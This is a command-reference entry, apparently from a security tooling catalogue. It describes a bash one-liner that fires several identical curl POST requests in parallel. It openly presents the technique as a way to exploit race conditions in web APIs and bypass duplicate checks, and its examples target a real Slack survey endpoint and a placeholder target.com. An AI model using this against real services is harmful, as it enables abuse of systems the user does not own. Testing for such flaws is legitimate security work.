---
id: cmd-concurrent-curl
name: run-concurrent-curl-requests
type: command
executor: bash
data: |
  | 
    (curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" ) & (curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" ) & (curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" )
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:22.284Z'
platforms:
  - Linux
  - macOS
tags:
  - race-condition
  - web
  - http
verified: false
validated: true
submitted: true
---

# run-concurrent-curl-requests

## Command

```bash
(curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" ) & (curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" ) & (curl -X POST https://example.com/api/endpoint -H "Cookie: session=..." -d "param1=value&param2=value" )
```

## Description

This command executes multiple identical curl POST requests in parallel by running them in the background using the & operator, ideal for exploiting race conditions in web APIs where concurrent submissions bypass duplicate checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `-H "Cookie: ..."` | Adds session cookies for authentication | Yes |
| `-d "param1=value&..."` | POST body data with form parameters | Yes |
| `&` | Runs the command in background for concurrency | Yes |

## Examples

### Basic Usage

```bash
(curl -X POST https://slack.com/api/survey.complete -H "Cookie: d=abc123" -d "done2=1" ) & (curl -X POST https://slack.com/api/survey.complete -H "Cookie: d=abc123" -d "done2=1" )
```

### Advanced Usage

```bash
(curl -X POST https://target.com/endpoint -H "Authorization: Bearer token" -H "Content-Type: application/x-www-form-urlencoded" -d "key1=val1&key2=val2" --silent ) & (curl -X POST https://target.com/endpoint -H "Authorization: Bearer token" -H "Content-Type: application/x-www-form-urlencoded" -d "key1=val1&key2=val2" --silent ) & (curl -X POST https://target.com/endpoint -H "Authorization: Bearer token" -H "Content-Type: application/x-www-form-urlencoded" -d "key1=val1&key2=val2" --silent )
```

## Expected Output

Multiple lines of HTTP responses (e.g., {"ok":true} for each successful request), indicating parallel execution without blocking. Failures may show 429 or auth errors if rate-limited.

## Related

- [[Related Procedure: Replay-Survey-Request-Concurrently]]
